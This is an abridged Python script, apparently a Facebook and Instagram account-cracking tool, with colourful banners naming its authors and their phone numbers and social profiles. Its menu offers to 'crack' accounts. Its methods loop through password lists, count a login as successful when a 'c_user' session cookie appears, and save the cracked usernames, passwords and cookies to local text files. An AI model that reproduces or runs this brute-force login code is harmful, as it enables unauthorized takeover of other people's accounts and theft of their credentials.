...
"""%s
 ...
 - facebook    : facebook.com/HassanRoyalz5542

 - Whatsapp     : +923111754100

 - github      : github.com/Hassan Chand
...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 RASHED DADU 🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [RASHED DADU] . ║
...
\x1b[0;33m║#YOUTUBE : RASHED TRICKS😐.  ║

\x1b[0;33m║#FACEBOOK : NAME [RASHEDUL ISLAM MANIK  II ].       ║

\x1b[0;33m║#GITHUB : https://github.com/RashedulislamManik.   ║

\x1b[0;33m║#WHATSAPP : 01829772192.                   ║
...
class ngentod:
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s Rashed/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)

            print '%s [%s*%s] akun %sCP %stersimpan di > %sRashed/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                try:
                    ...
                    open('Rashed/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                ...
                open('Rashed/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
    ...
    def mobil(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                open('Rashed/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
...
def menu():
    ...
    if unik == '':
    	...
    	print "\n%s [01] Rashed crack akun facebook "%(P)

        print "%s [02] Rashed crack akun instagram "%(P)
...
def igg():
	...
	print ("\n%s [%s!%s] Cth nama %s: %sRashed "%(P,M,P,M,K))
